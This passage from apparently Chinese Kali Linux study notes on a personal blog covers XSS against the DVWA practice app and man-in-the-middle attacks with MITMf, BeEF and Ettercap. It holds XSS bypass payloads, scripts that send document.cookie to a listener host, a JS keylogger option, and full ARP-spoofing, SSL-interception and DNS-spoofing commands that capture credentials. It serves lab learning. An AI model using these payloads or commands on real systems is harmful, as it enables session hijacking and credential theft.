<li>–Lnd      HTTP Response Splitting Induced code（HTTP响应代码）</li>
<li>–Anchor   Use Anchor Stealth payloader (DOM shadows!)</li>
<li>–Phpids   PHP - Exploit PHPIDS bug (0.6.5) to bypass filters（phpids是基于PHP的一个安全框架，存在Bug）</li>
<li>–Doss     XSS Denial of service (server) injection（服务器拒绝服务）</li>
<li>–Dos      XSS Denial of service (client) injection（客户端拒绝服务）</li>
<li>–B64      Base64 code encoding in META tag (rfc2397)（Base64编码）</li>
<li>–Onm      ONM - Use onMouseMove() event to inject code（页面事件注入）</li>
<li>–Ifr      Use <code>&lt;iframe&gt;</code>source tag to inject code（iframe注入）</li>
</ul>
</li>
</ul>
<h4 id="6-XSS–DVWA"><a href="#6-XSS–DVWA" class="headerlink" title="6. XSS–DVWA"></a>6. XSS–DVWA</h4><ul>
<li>Dvwa的XSS reflected（Low）</li>
</ul>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">    </span><br><span class="line">    if(!array_key_exists (&quot;name&quot;, $_GET) || $_GET[&apos;name&apos;] == NULL || $_GET[&apos;name&apos;] == &apos;&apos;)&#123;</span><br><span class="line"></span><br><span class="line">    $isempty = true;</span><br><span class="line"></span><br><span class="line">    &#125; else &#123;</span><br><span class="line">        </span><br><span class="line">    echo &apos;&lt;pre&gt;&apos;;</span><br><span class="line">    echo &apos;Hello &apos; . $_GET[&apos;name&apos;];</span><br><span class="line">    echo &apos;&lt;/pre&gt;&apos;;</span><br><span class="line">    </span><br><span class="line">    &#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>

<ul>
<li>Dvwa的XSS reflected（Medium）–对输出的过滤<ul>
<li>绕过方法：<code>&lt;scri&lt;script&gt;pt&gt;alert(&#39;xss&#39;);&lt;/scri&lt;script&gt;pt&gt;</code></li>
</ul>
</li>
</ul>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line">    if(!array_key_exists (&quot;name&quot;, $_GET) || $_GET[&apos;name&apos;] == NULL || $_GET[&apos;name&apos;] == &apos;&apos;)&#123;</span><br><span class="line"></span><br><span class="line">    $isempty = true;</span><br><span class="line"></span><br><span class="line">    &#125; else &#123;</span><br><span class="line"></span><br><span class="line">    echo &apos;&lt;pre&gt;&apos;;</span><br><span class="line">    echo &apos;Hello &apos; . str_replace(&apos;&lt;script&gt;&apos;, &apos;&apos;, $_GET[&apos;name&apos;]);</span><br><span class="line">    echo &apos;&lt;/pre&gt;&apos;; </span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>

<ul>
<li>Dvwa的XSS reflected（High）–对输出的过滤<ul>
<li>▲ htmlspecialchars() → 输出html编码&lt; → &lt; &gt; → &gt;</li>
<li>绕过尝试: <strong><code>🔺命令：xsser -u &quot;http://1.1.1.1/dvwa/vulnerabilities/&quot; -g &quot;xss_r/?name=&quot; --cookie=&quot;security=high; PHPSESSID=d23e469411707ff8210717e67c521a81&quot; -Cem=&#39;Mix,Une,Str,Hex&#39;</code></strong></li>
<li>▲ 若注入代码位于&lt;&gt;之内，可以不输入&lt;&gt;，直接输入代码，如Onclick=alert(‘xss’)</li>
</ul>
</li>
</ul>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">    </span><br><span class="line">    if(!array_key_exists (&quot;name&quot;, $_GET) || $_GET[&apos;name&apos;] == NULL || $_GET[&apos;name&apos;] == &apos;&apos;)&#123;</span><br><span class="line">    </span><br><span class="line">    $isempty = true;</span><br><span class="line">        </span><br><span class="line">    &#125; else &#123;</span><br><span class="line">    </span><br><span class="line">    echo &apos;&lt;pre&gt;&apos;;</span><br><span class="line">    echo &apos;Hello &apos; . htmlspecialchars($_GET[&apos;name&apos;]);</span><br><span class="line">    echo &apos;&lt;/pre&gt;&apos;;</span><br><span class="line">        </span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>

<h4 id="7-XSS-stored"><a href="#7-XSS-stored" class="headerlink" title="7. XSS stored"></a>7. XSS stored</h4><ul>
<li>存储型XSS<ul>
<li>长期存储于服务器端</li>
<li>每次用户访问都会被执行javascript脚本</li>
</ul>
</li>
<li>Name：客户端表单长度限制（好的Web Application同时在客户端和服务器端做长度限制）<ul>
<li>解除限制：浏览器客户端、截断代理</li>
</ul>
</li>
<li><code>&lt;script src=&quot;http://1.1.1.1/a.js&quot;&gt;&lt;/script&gt;</code></li>
<li>a.js源码（隐蔽性强）<ul>
<li>var img = new Image();</li>
<li>img src=”<a href="http://1.1.1.1/cookies.php?cookie=&quot;+document.cookie" target="_blank" rel="noopener">http://1.1.1.1/cookies.php?cookie=&quot;+document.cookie</a>;</li>
</ul>
</li>
</ul>
<blockquote>
<pre><code>⭐js源码
1.kali，/var/www/html，vi a.js
2.var img = new Image();
3.img src=&quot;http://1.1.1.1:88/cookies.php?cookie=&quot;+document.cookie;（88端口为nc侦听端口）
4.service apache2 start
5.浏览器注入：&lt;script src=&quot;http://1.1.1.1/a.js&quot;&gt;&lt;/script&gt;</code></pre></blockquote>
<h4 id="8-XSS-stored–DVWA（▲-换不同安全级别的时候，需要清除数据库）"><a href="#8-XSS-stored–DVWA（▲-换不同安全级别的时候，需要清除数据库）" class="headerlink" title="8. XSS stored–DVWA（▲ 换不同安全级别的时候，需要清除数据库）"></a>8. XSS stored–DVWA（▲ 换不同安全级别的时候，需要清除数据库）</h4><ul>
<li>DVWA的XSS stored（&amp;message、Low）<ul>
<li>基本没有对&amp;message、&amp;name过滤，可实现任意注入</li>
</ul>
</li>
</ul>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line">if(isset($_POST[&apos;btnSign&apos;]))</span><br><span class="line">&#123;</span><br><span class="line"></span><br><span class="line">   $message = trim($_POST[&apos;mtxMessage&apos;]);</span><br><span class="line">   $name    = trim($_POST[&apos;txtName&apos;]);</span><br><span class="line">   </span><br><span class="line">   // Sanitize message input</span><br><span class="line">   $message = stripslashes($message);</span><br><span class="line">   $message = mysql_real_escape_string($message);</span><br><span class="line">   </span><br><span class="line">   // Sanitize name input</span><br><span class="line">   $name = mysql_real_escape_string($name);</span><br><span class="line">  </span><br><span class="line">   $query = &quot;INSERT INTO guestbook (comment,name) VALUES (&apos;$message&apos;,&apos;$name&apos;);&quot;;</span><br><span class="line">   </span><br><span class="line">   $result = mysql_query($query) or die(&apos;&lt;pre&gt;&apos; . mysql_error() . &apos;&lt;/pre&gt;&apos; );</span><br><span class="line">   </span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>

<ul>
<li>DVWA的XSS stored（Medium）<ul>
<li>绕过方法：&amp;message基本无法注入，&amp;name可以通过<code>&lt;scri&lt;script&gt;pt&gt;alert(&#39;xss&#39;);&lt;/scri&lt;script&gt;pt&gt;</code>绕过 ▲ 2020.1.20&amp;name不需要绕过注入</li>
</ul>
</li>
</ul>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line">if(isset($_POST[&apos;btnSign&apos;]))</span><br><span class="line">&#123;</span><br><span class="line"></span><br><span class="line">   $message = trim($_POST[&apos;mtxMessage&apos;]);</span><br><span class="line">   $name    = trim($_POST[&apos;txtName&apos;]);</span><br><span class="line">   </span><br><span class="line">   // Sanitize message input</span><br><span class="line">   $message = trim(strip_tags(addslashes($message)));</span><br><span class="line">   $message = mysql_real_escape_string($message);</span><br><span class="line">   $message = htmlspecialchars($message);</span><br><span class="line">    </span><br><span class="line">   // Sanitize name input</span><br><span class="line">   $name = str_replace(&apos;&lt;script&gt;&apos;, &apos;&apos;, $name);</span><br><span class="line">   $name = mysql_real_escape_string($name);</span><br><span class="line">  </span><br><span class="line">   $query = &quot;INSERT INTO guestbook (comment,name) VALUES (&apos;$message&apos;,&apos;$name&apos;);&quot;;</span><br><span class="line">   </span><br><span class="line">   $result = mysql_query($query) or die(&apos;&lt;pre&gt;&apos; . mysql_error() . &apos;&lt;/pre&gt;&apos; );</span><br><span class="line">   </span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>

<ul>
<li>DVWA的XSS stored（High）</li>
</ul>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line">if(isset($_POST[&apos;btnSign&apos;]))</span><br><span class="line">&#123;</span><br><span class="line"></span><br><span class="line">   $message = trim($_POST[&apos;mtxMessage&apos;]);</span><br><span class="line">   $name    = trim($_POST[&apos;txtName&apos;]);</span><br><span class="line">   </span><br><span class="line">   // Sanitize message input</span><br><span class="line">   $message = stripslashes($message);</span><br><span class="line">   $message = mysql_real_escape_string($message);</span><br><span class="line">   $message = htmlspecialchars($message);</span><br><span class="line">   </span><br><span class="line">   // Sanitize name input</span><br><span class="line">   $name = stripslashes($name);</span><br><span class="line">   $name = mysql_real_escape_string($name); </span><br><span class="line">   $name = htmlspecialchars($name);</span><br><span class="line">  </span><br><span class="line">   $query = &quot;INSERT INTO guestbook (comment,name) VALUES (&apos;$message&apos;,&apos;$name&apos;);&quot;;</span><br><span class="line">   </span><br><span class="line">   $result = mysql_query($query) or die(&apos;&lt;pre&gt;&apos; . mysql_error() . &apos;&lt;/pre&gt;&apos; );</span><br><span class="line">   </span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>

<h4 id="9-XSS-DOM"><a href="#9-XSS-DOM" class="headerlink" title="9. XSS DOM"></a>9. XSS DOM</h4><ul>
<li>DOM型XSS<ul>
<li>一套JS和其他语言可调用的标准的API</li>
</ul>
</li>
</ul>
<p><img src="http://aliyun.wuyidaxue.top:8088/kodex/index.php?user/publicLink&fid=f66f-xKTDzcuepCGP1R9qnf5yzSEpWewBDFOJ4ZgiR74rXX7YTpJS9ZthPIXIwy-zMuvL6LE6JC52VMb9VnTpLNb9_SrR8jGaoghAOmTQyKrlr9h6MCdKg&file_name=/XSS-DOM.PNG" alt="DOM型XSS"></p>
<ul>
<li><code>&lt;script&gt;var img=document.createElement(&quot;img&quot;);img.src=&quot;http:// 192.168.20.8:88/log?&quot;+escape(document.cookie);&lt;/script&gt;</code></li>
</ul>
<h4 id="10-BEEF"><a href="#10-BEEF" class="headerlink" title="10. BEEF"></a>10. BEEF</h4><ul>
<li>浏览器攻击面（不可忽视，基本上最接近用户）<ul>
<li>应用普遍转移到B/S架构，浏览器成为统一客户端程序</li>
<li>结合社会工程学方法对浏览器进行攻击</li>
<li>攻击浏览器用户</li>
<li>通过注入的JS脚本，利用浏览器攻击其他网站</li>
</ul>
</li>
<li>BeFF（Browser exploitation framework）<ul>
<li>生成、交付payload</li>
<li>Ruby语言编写</li>
<li>服务器端：管理hooked客户端</li>
<li>客户端：运行客户端浏览器的Javascript脚本（hook）</li>
</ul>
</li>
<li>攻击手段<ul>
<li>利用网站XSS漏洞实现攻击</li>
<li>诱使客户端访问含有hook的伪造站点</li>
<li>结合中间人攻击注入hook脚本</li>
</ul>
</li>
</ul>
<blockquote>
<pre><code>⭐中间人攻击/劫持
运行商：链路劫持，插入js脚本，来宣传广告，黑色收入
Hacker：CDN劫持，在CDN节点上插入js脚本</code></pre></blockquote>
<ul>
<li>常见用途<ul>
<li>键盘记录器</li>
<li>网络扫描</li>
<li>浏览器信息收集</li>
<li>绑定shell</li>
<li>与metasploit集成</li>
</ul>
</li>
<li>演示页面：http://<IP_BeEF_Server>:3000/demos/basic.html</li>
<li>hook.js：<a href="http://127.0.0.1:3000/hook.js" target="_blank" rel="noopener">http://127.0.0.1:3000/hook.js</a></li>
<li>BeEF登陆界面：username:beef/password:beef ▲ 2020.1.20修改密码为admin</li>
<li>BeEF用户界面：<a href="http://127.0.0.1:3000/ul/panel" target="_blank" rel="noopener">http://127.0.0.1:3000/ul/panel</a></li>
<li>DVWA的XSS stored（$name进行hook，$message不注入）</li>
<li>Details：<ul>
<li>浏览器、插件版本信息；操作系统信息</li>
</ul>
</li>
<li>Logs：<ul>
<li>浏览器动作：焦点变化、鼠标点击、信息输入</li>
</ul>
</li>
<li>Commands：命令模块<ul>
<li>绿色模块：表示模块适合目标浏览器，并且执行结果被客户端不可见</li>
<li>红色模块：表示模块不适合当前用户，有些红色模块也可以正常执行</li>
<li>橙色模块：模块可用，但结果对用户可见（CAM弹窗申请权限等）</li>
<li>灰色模块：模块未在目标浏览器上测试过</li>
</ul>
</li>
<li>主要模块<ul>
<li>Browsers</li>
<li>Exploits</li>
<li>Host</li>
<li>Persistence（持久性）</li>
<li>Network</li>
</ul>
</li>
</ul>

          
        
      
    </div>
    
    
    

    

    

    

    <footer class="post-footer">
      

      

      

      
      
        <div class="post-eof"></div>
      
    </footer>
  </div>
  
  
  
  </article>


    
      

  

  
  
  

  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
  
  
  
  <div class="post-block">
    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2020/01/24/Kali%20Linux%E7%AC%94%E8%AE%B0(%E4%BA%94%E5%8D%81%E5%85%AB)%EF%BC%9ASSL%E3%80%81TLS%E4%B8%AD%E9%97%B4%E4%BA%BA%E6%94%BB%E5%87%BB--%E6%B3%A8%E5%85%A5XSS/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="name" content="Tomas">
      <meta itemprop="description" content="">
      <meta itemprop="image" content="/images/photo.jpg">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="Tomas'Blog">
    </span>

    
      <header class="post-header">

        
        
          <h1 class="post-title" itemprop="name headline">
                
                <a class="post-title-link" href="/2020/01/24/Kali%20Linux%E7%AC%94%E8%AE%B0(%E4%BA%94%E5%8D%81%E5%85%AB)%EF%BC%9ASSL%E3%80%81TLS%E4%B8%AD%E9%97%B4%E4%BA%BA%E6%94%BB%E5%87%BB--%E6%B3%A8%E5%85%A5XSS/" itemprop="url">Kali Linux笔记(五十八)：SSL、TLS中间人攻击--注入XSS</a></h1>
        

        <div class="post-meta">
          <span class="post-time">
            
              <span class="post-meta-item-icon">
                <i class="fa fa-calendar-o"></i>
              </span>
              
                <span class="post-meta-item-text">发表于</span>
              
              <time title="创建于" itemprop="dateCreated datePublished" datetime="2020-01-24T15:08:48+08:00">
                2020-01-24
              </time>
            

            

            
          </span>

          
            <span class="post-category" >
            
              <span class="post-meta-divider">|</span>
            
              <span class="post-meta-item-icon">
                <i class="fa fa-folder-o"></i>
              </span>
              
                <span class="post-meta-item-text">分类于</span>
              
              
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/Kali/" itemprop="url" rel="index">
                    <span itemprop="name">Kali</span>
                  </a>
                </span>

                
                
              
            </span>
          

          
            
          

          
          

          

          
            <div class="post-wordcount">
              
                
                <span class="post-meta-item-icon">
                  <i class="fa fa-file-word-o"></i>
                </span>
                
                  <span class="post-meta-item-text">字数统计&#58;</span>
                
                <span title="字数统计">
                  1.8k 字
                </span>
              

              
                <span class="post-meta-divider">|</span>
              

              
                <span class="post-meta-item-icon">
                  <i class="fa fa-clock-o"></i>
                </span>
                
                  <span class="post-meta-item-text">阅读时长 &asymp;</span>
                
                <span title="阅读时长">
                  8 分钟
                </span>
              
            </div>
          

          

        </div>
      </header>
    

    
    
    
    <div class="post-body" itemprop="articleBody">

      
      

      
        
          
            <hr>
<h4 id="1-中间人攻击（注入XSS）"><a href="#1-中间人攻击（注入XSS）" class="headerlink" title="1. 中间人攻击（注入XSS）"></a>1. 中间人攻击（注入XSS）</h4><ul>
<li>注入XSS<ul>
<li>结合ARP欺骗或DNS代理欺骗，实现中间人攻击</li>
<li>即使没有XSS漏洞，也可以凌空向每个HTTP请求中注入XSS攻击代码 </li>
<li>一旦得手，影响范围巨大 </li>
<li>如果中间人发生在运营商线路上，很难引起用户注意，隐蔽性高 </li>
</ul>
</li>
</ul>
<h4 id="2-中间人攻击–Mitmf-Beef"><a href="#2-中间人攻击–Mitmf-Beef" class="headerlink" title="2. 中间人攻击–Mitmf*Beef"></a>2. 中间人攻击–Mitmf*Beef</h4><ul>
<li>Mitmf 安装（无核心技术内容，冗杂性大）▲ 2020.1.24一些依赖包以及安装包无法找到<ul>
<li>曾经号称最好用的中间人攻击工具（kali 2.0后默认未安装） </li>
<li><strong><code>🔺命令：apt-get install python-dev python-setuptools libpcap0.8-dev libnetfilterqueue-dev libssl-dev libjpeg-dev libxml2-dev libxslt1-dev libcapstone3 libcapstone-dev libffi-dev file</code></strong> </li>
<li><strong><code>🔺命令：apt-get install mitmf</code></strong> </li>
<li><strong><code>🔺命令：pip uninstall twisted</code></strong> </li>
<li><strong><code>🔺命令：wget http://twistedmatrix.com/Releases/Twisted/15.5/Twisted15.5.0.tar.bz2</code></strong> </li>
<li><strong><code>🔺命令：pip install ./Twisted-15.5.0.tar.bz2</code></strong></li>
</ul>
</li>
<li>启动beef <ul>
<li><strong><code>🔺命令：cd /usr/share/beef-xss/</code></strong> </li>
<li><strong><code>🔺命令：./beef</code></strong> ▲ 2020.1.24修改为beef-xss（命令存在Bash中）</li>
</ul>
</li>
<li>mitmf中间人注入xss脚本（结合Beef）<ul>
<li><strong><code>🔺命令：mitmf --spoof --arp -i eth0 --gateway 1.1.1.1（正确网关地址） --target 1.1.1.2 --inject --js-url http://1.1.1.3:3000/hook.js</code></strong> （ARP地址欺骗）</li>
</ul>
</li>
<li>mitmf中间人注入xss脚本（不结合Beef） <ul>
<li><strong><code>🔺命令：mitmf --spoof --arp -i eth0 --gateway 192.168.20.2 --target 192.168.20.1 --jskeylogger</code></strong>（ARP地址欺骗）</li>
<li>–upsidedownternet（图片倒转）、–screen（/var/log/mitmf，屏幕快照） </li>
<li>–ferretng（抓取cookie）、–browserprofiler（浏览器及插件信息） </li>
<li>–smbtrap（抓取smb）、–smbauth（smb认证）</li>
<li>–hsts（新的安全协议）<ul>
<li>HTTP Strict Transport Security </li>
<li>防止协议降级、cookie窃取 </li>
<li>安全策略通过HTTP响应头”Strict-Transport-Security”实施 </li>
<li>限制user-agent、https等</li>
</ul>
</li>
<li>–filepwn（EXE执行程序的下载，插入后门程序）<ul>
<li>凌空插后门 </li>
</ul>
</li>
</ul>
</li>
</ul>
<h4 id="3-中间人攻击–Ettercap"><a href="#3-中间人攻击–Ettercap" class="headerlink" title="3. 中间人攻击–Ettercap"></a>3. 中间人攻击–Ettercap</h4><ul>
<li>Ettercap ▲ 2020.1.24Ettercap有点小问题，关于主机发现这一模块<ul>
<li>统一的中间人攻击工具 </li>
<li>转发MAC与本机相同，但IP与本机不同的数据包 </li>
<li>支持SSH1、SSL中间人攻击</li>
</ul>
</li>
<li>模块划分 <ul>
<li>Snifer </li>
<li>MITM </li>
<li>Filter </li>
<li>Log </li>
<li>Plugin</li>
</ul>
</li>
</ul>
<h4 id="4-Ettercap–Snifer"><a href="#4-Ettercap–Snifer" class="headerlink" title="4. Ettercap–Snifer"></a>4. Ettercap–Snifer</h4><ul>
<li>Snifer<ul>
<li>负责数据包转发</li>
<li>Unified<ul>
<li>单网卡情况下独立完成三层包转发</li>
<li>始终禁用内核IP_Forward功能</li>
</ul>
</li>
<li>Bridge <ul>
<li>双网卡情况下的一层MITM模式</li>
<li>可作为IPS过滤数据包</li>
<li>不可在网关上使用（透明网桥）</li>
</ul>
</li>
</ul>
</li>
</ul>
<h4 id="5-Ettercap–MITM"><a href="#5-Ettercap–MITM" class="headerlink" title="5. Ettercap–MITM"></a>5. Ettercap–MITM</h4><ul>
<li>MITM <ul>
<li>把流量重定向到ettercap主机上 </li>
<li>可以使用其他工具实现MITM，ettercap之作嗅探和过滤使用</li>
</ul>
</li>
<li>实现MITM的方法 <ul>
<li>ARP（一般为动态类型的ARP表）</li>
<li>ICMP <ul>
<li>ICMP路由重定向，半双工，回包不经过Kali（去包回包都经过Kali为全双工）</li>
<li>-M icmp:00:11:22:33:44:55/10.0.0.1（真实网关的MAC/IP）</li>
</ul>
</li>
<li>DHCP <ul>
<li>修改网关地址，半双工，回包不经过Kali</li>
<li>DHCP发包过程Discover、Offer、Resquest、ACK</li>
<li>−M dhcp:192.168.0.30,35,50−60/255.255.255.0/192.168.0.1（DNS）</li>
</ul>
</li>
<li>Switch Port Stealing（交换机端口窃取）<ul>
<li>交换机根据源MAC地址更新</li>
<li>flood目标地址是本机，源地址是受害者的包（向交换机发送大量泛洪攻击）</li>
<li>适用于ARP静态绑定的环境（arp -s → 添加静态绑定的ARP）</li>
<li>-M port /1.1.1.1/ /1.1.1.2/ </li>
</ul>
</li>
<li>NDP <ul>
<li>IPv6协议欺骗技术</li>
<li>-M ndp //fe80::260d:afff:fe6e:f378/ //2001:db8::2:1/</li>
</ul>
</li>
</ul>
</li>
<li>Linux2.4以上内核对ARP地址欺骗的约束 <ul>
<li>收到非请求的ARP响应包，不更新本地ARP缓存 </li>
<li>Ettercap使用ARP request包进行攻击 </li>
</ul>
</li>
<li>Solaris不根据ARP包更新本地ARP缓存 <ul>
<li>Ettercap使用先发ICMP包来更新ARP缓存</li>
</ul>
</li>
</ul>
<h4 id="6-Ettercap–准备"><a href="#6-Ettercap–准备" class="headerlink" title="6. Ettercap–准备"></a>6. Ettercap–准备</h4><ul>
<li>用户操作界面 <ul>
<li>-T 文本界面（文本字符）</li>
<li>-G 图形界面 </li>
<li>-C 基于文本的图形界面（文本类似图形化）</li>
<li>-D 后台模式 </li>
</ul>
</li>
<li>指定目标 <ul>
<li>IPv4：MAC/IPv4/Ports </li>
<li>IPv6：MAC/IPv4/IPv6/Ports </li>
<li>/10.0.0.1−5;10.0.1.33/20−25,80,110</li>
</ul>
</li>
<li>权限 <ul>
<li>主配置文件：/etc/ettercap/etter.conf</li>
<li>需要root权限打开链路层Socket连接，然后使用nobody账号运行 </li>
<li>日志写入目录需要nobody有写入权 </li>
<li>修改etter.conf：EC_UID=65534/EC_GID=65534 → EC_UID=0/EC_GID=0</li>
</ul>
</li>
<li>基于伪造证书的SSL MITIM <ul>
<li>Bridge模式不支持SSL MITM ▲ 2020.1.24报额外参数的错误</li>
<li><strong><code>🔺命令：openssl genrsa −out etter.ssl.crt 1024</code></strong> </li>
<li><strong><code>🔺命令：openssl req −new−keyetter.ssl.crt −out tmp.csr</code></strong> </li>
<li><strong><code>🔺命令：openssl x509 −req −days 1825 −in tmp.csr −signkey etter.ssl.crt −out tmp.new</code></strong> </li>
<li><strong><code>🔺命令：cat tmp.new&gt;&gt;etter.ssl.crt</code></strong></li>
<li><strong><code>🔺命令：rm −f tmp.newtmp.csr</code></strong></li>
</ul>
</li>
</ul>
<h4 id="7-Ettercap–字符模式"><a href="#7-Ettercap–字符模式" class="headerlink" title="7. Ettercap–字符模式"></a>7. Ettercap–字符模式</h4><ul>
<li>参数<ul>
<li>-M（MITM技术）</li>
<li>-F（过滤器）</li>
<li>-P（模块）</li>
<li>-w（网络流量记录）</li>
<li>-l（简单记录日志）</li>
<li>-L（记录所有日志信息）</li>
<li>-m（账号密码信息）</li>
<li>-q（安静模式/有用的信息）</li>
</ul>
</li>
<li>MITM攻击<ul>
<li><strong><code>🔺命令：ettercap -i eth0 -T -M arp -q /192.168.1.1// /192.168.1.2// -F 1.ef -P autoadd -w a.cap -l loginfo -L logall -m message</code></strong></li>
<li>找一个FTP服务器</li>
<li>输入账号/密码</li>
<li>查看ettercap字符界面</li>
</ul>
</li>
<li>Ettercap 日志查看 ▲ 2020.1.24查看无权限<ul>
<li><strong><code>🔺命令：cat message</code></strong>（root目录下）</li>
<li><strong><code>🔺命令：ls log发现文件是加密信息</code></strong></li>
<li><strong><code>🔺命令：etterlog -p log.eci 查看获取的密码</code></strong></li>
<li><strong><code>🔺命令：etterlog -c log.ecp 列出Log中的连接</code></strong></li>
<li><strong><code>🔺命令：etterlog -c -f //1.1.1.1/ log.ecp</code></strong></li>
<li><strong><code>🔺命令：etterlog -B -n -s -F TCP:1.1.1.1:20;1.1.1.2:1234 log.ecp &gt; aa 选择相应的连接并榨取文件</code></strong></li>
</ul>
</li>
</ul>
<h4 id="8-Ettercap–图形界面"><a href="#8-Ettercap–图形界面" class="headerlink" title="8. Ettercap–图形界面"></a>8. Ettercap–图形界面</h4><ul>
<li>Sniff → Unified/Bridge sniffing → 网卡</li>
<li>Host → Scan for hosts（主机扫描，会生成一个主机列表）</li>
<li>选择目标 → Add to target1 / 选择目标 → Add to target2</li>
<li>Mitm → ARP → Sniff remote connections（ARP双向中间人，Single为半双工）</li>
<li>Start → Start sniffing</li>
<li>找一个FTP服务器</li>
<li>输入账号/密码</li>
<li>查看ettercap图形界面</li>
</ul>
<h4 id="9-Ettercap–SSL中间人攻击"><a href="#9-Ettercap–SSL中间人攻击" class="headerlink" title="9. Ettercap–SSL中间人攻击"></a>9. Ettercap–SSL中间人攻击</h4><ul>
<li>SSL MITM（默认无开启，需要在配置文件中修改，图形界面）<ul>
<li><strong><code>🔺命令：vi /etc/ettercap/etter.conf</code></strong>（Linux → The second iptables）</li>
<li>Sniff → Unified/Bridge sniffing → 网卡</li>
<li>Host → Scan for hosts（主机扫描，会生成一个主机列表）</li>
<li>选择目标 → Add to target1 / 选择目标 → Add to target2</li>
<li>Mitm → ARP → Sniff remote connections（ARP双向中间人，Single为半双工）</li>
<li>Start → Start sniffing</li>
<li>找一个有SSL页面</li>
<li>输入账号/密码</li>
<li>查看ettercap图形界面</li>
</ul>
</li>
</ul>
<h4 id="10-Ettercap–DNS欺骗"><a href="#10-Ettercap–DNS欺骗" class="headerlink" title="10. Ettercap–DNS欺骗"></a>10. Ettercap–DNS欺骗</h4><ul>
<li>DNS欺骗（图形界面） <ul>
<li>dns_spoof插件配置文件 </li>
<li><strong><code>🔺命令：vi /etc/ettercap/etter.dns</code></strong>（修改欺骗的域名对应的IP地址）</li>
<li>Plugins → Load a plugins → Load ec_dns_spoof.so</li>
<li>Plugins → Manage the plugins → 双击dns_spoof启动</li>
<li>Sniff → Unified/Bridge sniffing → 网卡</li>
<li>Host → Scan for hosts（主机扫描，会生成一个主机列表）</li>
<li>选择目标 → Add to target1 / 选择目标 → Add to target2</li>
<li>Mitm → ARP → Sniff remote connections（ARP双向中间人，Single为半双工）</li>
<li>Start → Start sniffing</li>
<li>找一个有SSL页面</li>
<li>输入账号/密码</li>
<li>查看ettercap图形界面</li>
</ul>
</li>
<li>DNS欺骗（字符界面）<ul>
<li><strong><code>🔺命令：ettercap -i eth0 -T -M arp -q /192.168.1.1// /192.168.1.2// -P dns_spoof</code></strong></li>
<li><strong><code>🔺命令：ipconfig /flushdns</code></strong></li>
<li><strong><code>🔺命令：ping 欺骗的域名</code></strong></li>
</ul>
</li>
</ul>
